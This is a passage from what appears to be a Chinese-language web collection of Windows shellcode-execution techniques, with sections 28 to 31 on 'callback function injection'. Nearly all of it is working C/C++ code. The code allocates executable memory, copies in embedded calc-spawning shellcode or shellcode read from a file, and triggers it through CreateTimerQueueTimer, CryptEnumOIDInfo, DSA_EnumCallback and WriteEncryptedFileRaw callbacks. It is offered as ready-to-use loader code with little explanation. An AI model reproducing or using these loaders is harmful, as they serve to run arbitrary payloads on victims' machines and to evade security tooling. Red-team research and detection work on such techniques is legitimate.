class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">25</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">26</span><br><span class="linenum hljs-number">27</span><br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span><br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;addr&nbsp;=&nbsp;::VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;::RtlMoveMemory(addr,&nbsp;op,&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span><br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;timer;<br><span class="linenum hljs-number">38</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;<span class="hljs-built_in">queue</span>&nbsp;=&nbsp;::CreateTimerQueue();<br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;gDoneEvent&nbsp;=&nbsp;::CreateEvent(<span class="hljs-literal">NULL</span>,&nbsp;TRUE,&nbsp;FALSE,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(!::CreateTimerQueueTimer(&amp;timer,&nbsp;<span class="hljs-built_in">queue</span>,&nbsp;(WAITORTIMERCALLBACK)addr,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-number">100</span>,&nbsp;<span class="hljs-number">0</span>,&nbsp;<span class="hljs-number">0</span>))&nbsp;{<br><span class="linenum hljs-number">41</span><br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Fail"</span>);<br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">44</span><br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(::WaitForSingleObject(gDoneEvent,&nbsp;INFINITE)&nbsp;!=&nbsp;WAIT_OBJECT_0)<br><span class="linenum hljs-number">46</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"WaitForSingleObject&nbsp;failed&nbsp;(%d)\n"</span>,&nbsp;GetLastError());<br><span class="linenum hljs-number">47</span>}<br></code></pre>
<h1 id="h28cryptenumoidinfo"><span>28.回调函数注入 通过 CryptEnumOIDInfo</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;wincrypt.h&gt;</span></span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span>&nbsp;comment(lib,&nbsp;<span class="hljs-meta-string">"Crypt32.lib"</span>)</span><br><span class="linenum hljs-number"> 6</span><br><span class="linenum hljs-number"> 7</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number"> 9</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number">10</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number">11</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">25</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">26</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">27</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span><br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span><br><span class="linenum hljs-number">32</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">33</span><br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;address&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_RESERVE&nbsp;|&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(address,&nbsp;&amp;op[<span class="hljs-number">0</span>],&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">37</span><br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;CryptEnumOIDInfo(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;(PFN_CRYPT_ENUM_OID_INFO)address);<br><span class="linenum hljs-number">40</span><br><span class="linenum hljs-number">41</span><br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">43</span><br><span class="linenum hljs-number">44</span>}<br></code></pre>
<h1 id="h29dsa_enumcallback"><span>29.回调函数注入 通过 DSA_EnumCallback</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h/FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Written/Compiled:&nbsp;Visual&nbsp;Studio&nbsp;2022</span><br><span class="linenum hljs-number"> 3</span><span class="hljs-comment">//&nbsp;Usage:&nbsp;this.exe&nbsp;&lt;shellcode&nbsp;file&gt;</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span>&nbsp;comment(lib,&nbsp;<span class="hljs-meta-string">"Comctl32.lib"</span>)</span><br><span class="linenum hljs-number"> 5</span><br><span class="linenum hljs-number"> 6</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 7</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 8</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;dpa_dsa.h&gt;</span></span><br><span class="linenum hljs-number"> 9</span><br><span class="linenum hljs-number">10</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span></span>;<br><span class="linenum hljs-number">11</span><br><span class="linenum hljs-number">12</span><span class="hljs-function">INT&nbsp;<span class="hljs-title">wmain</span><span class="hljs-params">(INT&nbsp;argc,&nbsp;WCHAR*&nbsp;argv[])</span><br><span class="linenum hljs-number">13</span></span>{<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;BOOL&nbsp;Ret&nbsp;=&nbsp;FALSE;<br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;SCLen&nbsp;=&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;PCHAR&nbsp;Shellcode&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">17</span><br><span class="linenum hljs-number">18</span>&nbsp;&nbsp;&nbsp;&nbsp;HDSA&nbsp;hDSA&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">19</span><br><span class="linenum hljs-number">20</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(argc&nbsp;!=&nbsp;<span class="hljs-number">2</span>)<br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">22</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Usage:&nbsp;DSA_EnumCallback.exe&nbsp;C:\\Path\\To\\Shellcode.bin"</span>);<br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">24</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">25</span><br><span class="linenum hljs-number">26</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//Read&nbsp;shellcode&nbsp;and&nbsp;setup</span><br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;Ret&nbsp;=&nbsp;ReadContents(argv[<span class="hljs-number">1</span>],&nbsp;&amp;Shellcode,&nbsp;&amp;SCLen);<br><span class="linenum hljs-number">28</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(!Ret)<br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;SCLen,<br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">33</span><br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(hAlloc,&nbsp;Shellcode,&nbsp;SCLen);<br><span class="linenum hljs-number">35</span><br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;hDSA&nbsp;=&nbsp;DSA_Create(<span class="hljs-number">1</span>,&nbsp;<span class="hljs-number">1</span>);<br><span class="linenum hljs-number">37</span><br><span class="linenum hljs-number">38</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//Need&nbsp;to&nbsp;add&nbsp;an&nbsp;item&nbsp;to&nbsp;the&nbsp;dynamic&nbsp;structure&nbsp;array</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;DSA_AppendItem(hDSA,&nbsp;&amp;hDSA);<br><span class="linenum hljs-number">40</span><br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//Enum&nbsp;and&nbsp;execute</span><br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;DSA_EnumCallback(hDSA,&nbsp;(PFNDAENUMCALLBACK)hAlloc,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">43</span><br><span class="linenum hljs-number">44</span>CLEANUP:<br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(Shellcode)<br><span class="linenum hljs-number">46</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">free</span>(Shellcode);<br><span class="linenum hljs-number">47</span><br><span class="linenum hljs-number">48</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(hDSA)<br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DSA_Destroy(hDSA);<br><span class="linenum hljs-number">50</span><br><span class="linenum hljs-number">51</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">52</span>}<br><span class="linenum hljs-number">53</span><br><span class="linenum hljs-number">54</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span><br><span class="linenum hljs-number">55</span></span>{<br><span class="linenum hljs-number">56</span>&nbsp;&nbsp;&nbsp;&nbsp;FILE*&nbsp;f&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">57</span>&nbsp;&nbsp;&nbsp;&nbsp;_wfopen_s(&amp;f,&nbsp;Filepath,&nbsp;<span class="hljs-string">L"rb"</span>);<br><span class="linenum hljs-number">58</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(f)<br><span class="linenum hljs-number">59</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">60</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_END);<br><span class="linenum hljs-number">61</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*BufferSize&nbsp;=&nbsp;ftell(f);<br><span class="linenum hljs-number">62</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_SET);<br><span class="linenum hljs-number">63</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*Buffer&nbsp;=&nbsp;<span class="hljs-built_in">malloc</span>(*BufferSize);<br><span class="linenum hljs-number">64</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fread(*Buffer,&nbsp;*BufferSize,&nbsp;<span class="hljs-number">1</span>,&nbsp;f);<br><span class="linenum hljs-number">65</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose(f);<br><span class="linenum hljs-number">66</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">67</span><br><span class="linenum hljs-number">68</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;(*BufferSize&nbsp;!=&nbsp;<span class="hljs-number">0</span>)&nbsp;?&nbsp;TRUE&nbsp;:&nbsp;FALSE;<br><span class="linenum hljs-number">69</span>}<br></code></pre>
<h1 id="h30encryptedfileraw"><span>30.回调函数注入 通过 EncryptedFileRaw</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h/FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Written/Compiled:&nbsp;Visual&nbsp;Studio&nbsp;2022</span><br><span class="linenum hljs-number"> 3</span><span class="hljs-comment">//&nbsp;Usage:&nbsp;this.exe&nbsp;&lt;shellcode&nbsp;file&gt;&nbsp;&lt;another&nbsp;file&gt;</span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 6</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span></span>;<br><span class="linenum hljs-number"> 9</span><br><span class="linenum hljs-number">10</span><span class="hljs-function">INT&nbsp;<span class="hljs-title">wmain</span><span class="hljs-params">(INT&nbsp;argc,&nbsp;WCHAR*&nbsp;argv[])</span><br><span class="linenum hljs-number">11</span></span>{<br><span class="linenum hljs-number">12</span>&nbsp;&nbsp;&nbsp;&nbsp;BOOL&nbsp;Ret&nbsp;=&nbsp;FALSE;<br><span class="linenum hljs-number">13</span>&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;SCLen&nbsp;=&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;PCHAR&nbsp;Shellcode&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">15</span><br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;pContext&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">17</span><br><span class="linenum hljs-number">18</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(argc&nbsp;!=&nbsp;<span class="hljs-number">3</span>)<br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">20</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Usage:&nbsp;WriteEncryptedFileRaw.exe&nbsp;C:\\Path\\To\\Shellcode.bin&nbsp;C:\\Path\\to\\a\\file.txt"</span>);<br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">22</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">23</span><br><span class="linenum hljs-number">24</span>&nbsp;&nbsp;&nbsp;&nbsp;Ret&nbsp;=&nbsp;ReadContents(argv[<span class="hljs-number">1</span>],&nbsp;&amp;Shellcode,&nbsp;&amp;SCLen);<br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(!Ret)<br><span class="linenum hljs-number">26</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">27</span><br><span class="linenum hljs-number">28</span>&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;SCLen,<br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(hAlloc,&nbsp;Shellcode,&nbsp;SCLen);<br><span class="linenum hljs-number">32</span><br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;OpenEncryptedFileRaw(argv[<span class="hljs-number">2</span>],&nbsp;CREATE_FOR_IMPORT,&nbsp;&amp;pContext);<br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;WriteEncryptedFileRaw((PFE_IMPORT_FUNC)hAlloc,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;pContext);<br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span>CLEANUP:<br><span class="linenum hljs-number">38</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(Shellcode)<br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">free</span>(Shellcode);<br><span class="linenum hljs-number">40</span><br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(pContext)<br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CloseEncryptedFileRaw(pContext);<br><span class="linenum hljs-number">43</span><br><span class="linenum hljs-number">44</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">45</span>}<br><span class="linenum hljs-number">46</span><br><span class="linenum hljs-number">47</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span><br><span class="linenum hljs-number">48</span></span>{<br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;FILE*&nbsp;f&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">50</span>&nbsp;&nbsp;&nbsp;&nbsp;_wfopen_s(&amp;f,&nbsp;Filepath,&nbsp;<span class="hljs-string">L"rb"</span>);<br><span class="linenum hljs-number">51</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(f)<br><span class="linenum hljs-number">52</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">53</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_END);<br><span class="linenum hljs-number">54</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*BufferSize&nbsp;=&nbsp;ftell(f);<br><span class="linenum hljs-number">55</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_SET);<br><span class="linenum hljs-number">56</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*Buffer&nbsp;=&nbsp;<span class="hljs-built_in">malloc</span>(*BufferSize);<br><span class="linenum hljs-number">57</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fread(*Buffer,&nbsp;*BufferSize,&nbsp;<span class="hljs-number">1</span>,&nbsp;f);<br><span class="linenum hljs-number">58</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose(f);<br><span class="linenum hljs-number">59</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">60</span><br><span class="linenum hljs-number">61</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;(*BufferSize&nbsp;!=&nbsp;<span class="hljs-number">0</span>)&nbsp;?&nbsp;TRUE&nbsp;:&nbsp;FALSE;<br><span class="linenum hljs-number">62</span>}<br></code></pre>
<h1 id="h31enumchildwindows"><span>31.回调函数注入 通过 EnumChildWindows</span></h1>
